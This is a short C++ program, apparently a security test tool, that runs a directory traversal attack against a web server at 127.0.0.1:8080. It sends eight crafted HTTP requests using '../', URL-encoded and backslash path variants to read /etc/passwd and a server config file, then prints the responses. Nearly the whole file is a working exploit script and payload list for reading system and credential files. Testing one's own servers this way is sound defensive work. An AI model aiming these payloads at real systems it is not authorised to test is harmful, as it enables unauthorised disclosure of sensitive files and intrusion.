#include <iostream>
#include <cstring>
#include <vector>
#include <thread>
#include <chrono>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define close closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 8080;

const char* traversalPayloads[] = {
    "GET /../etc/passwd HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "GET /../../etc/passwd HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "GET /../config/server.conf HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "GET /../../../etc/passwd HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "GET /.%2e/etc/passwd HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "GET /%2e%2e/etc/passwd HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "GET /..\\..\\etc\\passwd HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "GET /www/../etc/passwd HTTP/1.1\r\nHost: localhost\r\n\r\n",
    nullptr
};

void directoryTraversalAttack() {
#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    for (const char** payload = traversalPayloads; *payload != nullptr; payload++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        sockaddr_in serverAddr{};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

        if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == 0) {
            send(sock, *payload, strlen(*payload), 0);

            char buffer[4096];
            ssize_t bytes = recv(sock, buffer, sizeof(buffer), 0);
            if (bytes > 0) {
                std::cout << "Payload: " << *payload << std::endl;
                std::cout << "Response: " << std::string(buffer, bytes).substr(0, 100) << "..." << std::endl;
            }

            close(sock);
        } else {
            close(sock);
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

#ifdef _WIN32
    WSACleanup();
#endif
}

int main(int argc, char* argv[]) {
    std::cout << "Starting directory traversal attack test..." << std::endl;

    directoryTraversalAttack();

    std::cout << "Test completed!" << std::endl;
    return 0;
}